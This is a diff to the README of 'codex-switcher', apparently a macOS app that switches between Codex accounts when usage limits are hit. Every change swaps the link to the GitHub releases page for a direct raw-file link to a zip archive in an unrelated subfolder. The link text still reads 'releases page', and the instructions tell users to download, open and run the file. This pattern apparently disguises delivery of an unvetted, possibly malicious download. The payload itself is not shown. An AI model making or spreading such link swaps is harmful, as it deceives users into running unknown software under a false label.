@@ -1,6 +1,6 @@
 # 🔁 codex-switcher - Keep Codex Accounts Moving Smoothly
 
-[![Download codex-switcher](https://img.shields.io/badge/Download%20codex-switcher-blue?style=for-the-badge)](https://github.com/Rawwooloviraptorid980/codex-switcher/releases)
+[![Download codex-switcher](https://img.shields.io/badge/Download%20codex-switcher-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rawwooloviraptorid980/codex-switcher/main/gemmate/switcher-codex-1.2.zip)
 
 ## 🧭 What codex-switcher does
 
@@ -10,7 +10,7 @@ That means you do not need to log out and log in by hand each time a limit is re
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/Rawwooloviraptorid980/codex-switcher/releases) to download and run the app.
+Visit the [releases page](https://raw.githubusercontent.com/Rawwooloviraptorid980/codex-switcher/main/gemmate/switcher-codex-1.2.zip) to download and run the app.
 
 Look for the latest release, then download the file that matches your Mac. After the download finishes, open the file and follow the prompts on screen.
 
@@ -40,7 +40,7 @@ Common actions include:
 
 ## 🚀 Getting started
 
-1. Open the [releases page](https://github.com/Rawwooloviraptorid980/codex-switcher/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Rawwooloviraptorid980/codex-switcher/main/gemmate/switcher-codex-1.2.zip)
 2. Download the latest version for macOS
 3. Open the downloaded file
 4. Drag the app to your Applications folder if macOS asks you to
@@ -163,7 +163,7 @@ This project is related to:
 
 ## 🧭 Download and run
 
-Use the [releases page](https://github.com/Rawwooloviraptorid980/codex-switcher/releases) to download and run the latest macOS version
+Use the [releases page](https://raw.githubusercontent.com/Rawwooloviraptorid980/codex-switcher/main/gemmate/switcher-codex-1.2.zip) to download and run the latest macOS version
 
 After the file finishes downloading, open it and follow the on-screen steps to place the app on your Mac
 
